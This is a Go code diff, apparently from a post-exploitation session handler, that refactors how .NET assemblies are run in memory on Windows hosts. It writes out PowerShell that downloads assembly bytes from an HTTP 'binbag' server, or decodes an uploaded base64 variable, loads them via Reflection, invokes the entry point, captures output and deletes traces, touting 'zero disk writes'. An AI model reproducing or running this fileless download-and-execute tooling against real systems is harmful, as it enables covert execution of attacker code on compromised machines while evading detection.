@@ -355,6 +355,64 @@ func buildWindowsPowerShellB64Command(varName string, args []string) string {
 	return fmt.Sprintf("$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($%s)); $sb = [scriptblock]::Create($decoded); & $sb%s; Remove-Variable -Name %s -ErrorAction SilentlyContinue", varName, argsStr, varName)
 }
 
+func dotNetArgsLiteral(args []string) string {
+	if len(args) == 0 {
+		return "@()"
+	}
+	quotedArgs := make([]string, len(args))
+	for i, arg := range args {
+		quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
+	}
+	return "@(" + strings.Join(quotedArgs, ", ") + ")"
+}
+
+func buildWindowsDotNetExecutionCore(byteSourceExpr, argsLiteral string) string {
+	return fmt.Sprintf(`try {
+    $bytes = %s
+    $assembly = [System.Reflection.Assembly]::Load($bytes)
+    $entryPoint = $assembly.EntryPoint
+    if ($entryPoint -ne $null) {
+        $output = & {
+            $oldOut = [Console]::Out
+            $oldErr = [Console]::Error
+            $sw = New-Object System.IO.StringWriter
+            [Console]::SetOut($sw)
+            [Console]::SetError($sw)
+            try {
+                $params = @(,[string[]]%s)
+                $entryPoint.Invoke($null, $params) | Out-Null
+            } finally {
+                [Console]::SetOut($oldOut)
+                [Console]::SetError($oldErr)
+                $result = $sw.ToString()
+                $sw.Dispose()
+                $result
+            }
+        }
+        Write-Output $output
+    } else {
+        Write-Host 'ERROR: No entry point found in assembly'
+    }
+} catch {
+    Write-Host "ERROR: $_"
+}`, byteSourceExpr, argsLiteral)
+}
+
+func buildWindowsDotNetHTTPCommand(httpURL string, args []string) string {
+	return buildWindowsDotNetExecutionCore(
+		fmt.Sprintf("(New-Object Net.WebClient).DownloadData('%s')", httpURL),
+		dotNetArgsLiteral(args),
+	)
+}
+
+func buildWindowsDotNetB64Command(varName string, args []string) string {
+	core := buildWindowsDotNetExecutionCore(
+		fmt.Sprintf("[System.Convert]::FromBase64String($%s)", varName),
+		dotNetArgsLiteral(args),
+	)
+	return core + fmt.Sprintf("\nRemove-Variable -Name %s -ErrorAction SilentlyContinue", varName)
+}
+
 // RunPowerShellInMemory executes PowerShell scripts in-memory (Windows, zero disk writes)
 // Similar to RunScriptInMemory but for PowerShell on Windows
 func (s *SessionInfo) RunPowerShellInMemory(ctx context.Context, scriptSource string, args []string) error {
@@ -458,18 +516,6 @@ func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource stri
 		return fmt.Errorf("failed to create output file: %w", err)
 	}
 
-	// Build args (PowerShell array syntax)
-	argsStr := ""
-	if len(args) > 0 {
-		quotedArgs := make([]string, len(args))
-		for i, arg := range args {
-			quotedArgs[i] = fmt.Sprintf("'%s'", strings.ReplaceAll(arg, "'", "''"))
-		}
-		argsStr = "@(" + strings.Join(quotedArgs, ", ") + ")"
-	} else {
-		argsStr = "@()"
-	}
-
 	// Try HTTP method first when binbag is enabled (DownloadData + Reflection.Load - blazing fast!)
 	if GlobalRuntimeConfig != nil && GlobalRuntimeConfig.BinbagEnabled {
 		filename := filepath.Base(localPath)
@@ -482,50 +528,8 @@ func (s *SessionInfo) RunDotNetInMemory(ctx context.Context, assemblySource stri
 		}
 		time.Sleep(300 * time.Millisecond)
 
-		fmt.Println(ui.Info(fmt.Sprintf("Executing .NET assembly (HTTP in-memory) and saving output to: %s", outputPath)))
-
-		go func() {
-			time.Sleep(200 * time.Millisecond)
-
-			// Download bytes directly via HTTP + Reflection.Assembly.Load - single request!
-			cmd := fmt.Sprintf(`
-try {
-    $bytes = (New-Object Net.WebClient).DownloadData('%s')
-    $assembly = [System.Reflection.Assembly]::Load($bytes)
-    $entryPoint = $assembly.EntryPoint
-    if ($entryPoint -ne $null) {
-        $output = & {
-            $oldOut = [Console]::Out
-            $oldErr = [Console]::Error
-            $sw = New-Object System.IO.StringWriter
-            [Console]::SetOut($sw)
-            [Console]::SetError($sw)
-            try {
-                $params = @(,[string[]]%s)
-                $entryPoint.Invoke($null, $params) | Out-Null
-            } finally {
-                [Console]::SetOut($oldOut)
-                [Console]::SetError($oldErr)
-                $result = $sw.ToString()
-                $sw.Dispose()
-                $result
-            }
-        }
-        Write-Output $output
-    } else {
-        Write-Host 'ERROR: No entry point found in assembly'
-    }
-} catch {
-    Write-Host "ERROR: $_"
-}
-`, httpURL, argsStr)
-
-			if err := s.Handler.ExecuteWithStreaming(cmd+"\r\n", outputPath); err != nil {
-				fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			}
-		}()
-
-		return nil
+		remoteCmd := buildWindowsDotNetHTTPCommand(httpURL, args)
+		return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
 	}
 
 	// Fallback: b64 variable upload (works without binbag)
@@ -543,53 +547,8 @@ try {
 	}
 
 	time.Sleep(300 * time.Millisecond)
-
-	fmt.Println(ui.Info(fmt.Sprintf("Executing .NET assembly (in-memory) and saving output to: %s", outputPath)))
-
-	go func() {
-		time.Sleep(200 * time.Millisecond)
-
-		cmd := fmt.Sprintf(`
-try {
-    $bytes = [System.Convert]::FromBase64String($%s)
-    $assembly = [System.Reflection.Assembly]::Load($bytes)
-    $entryPoint = $assembly.EntryPoint
-    if ($entryPoint -ne $null) {
-        $output = & {
-            $oldOut = [Console]::Out
-            $oldErr = [Console]::Error
-            $sw = New-Object System.IO.StringWriter
-            [Console]::SetOut($sw)
-            [Console]::SetError($sw)
-
-            try {
-                $params = @(,[string[]]%s)
-                $entryPoint.Invoke($null, $params) | Out-Null
-            } finally {
-                [Console]::SetOut($oldOut)
-                [Console]::SetError($oldErr)
-                $result = $sw.ToString()
-                $sw.Dispose()
-                $result
-            }
-        }
-        Write-Output $output
-    } else {
-        Write-Host 'ERROR: No entry point found in assembly'
-    }
-} catch {
-    Write-Host "ERROR: $_"
-}
-Remove-Variable -Name %s -ErrorAction SilentlyContinue
-`, varName, argsStr, varName)
-
-		if err := s.Handler.ExecuteWithStreaming(cmd+"\r\n", outputPath); err != nil {
-			fmt.Println(ui.Error(fmt.Sprintf("Execution error: %v", err)))
-			return
-		}
-	}()
-
-	return nil
+	remoteCmd := buildWindowsDotNetB64Command(varName, args)
+	return s.Handler.ExecuteWithStreamingCtx(ctx, remoteCmd, outputPath)
 }
 
 func pythonArgvLiteral(args []string) string {
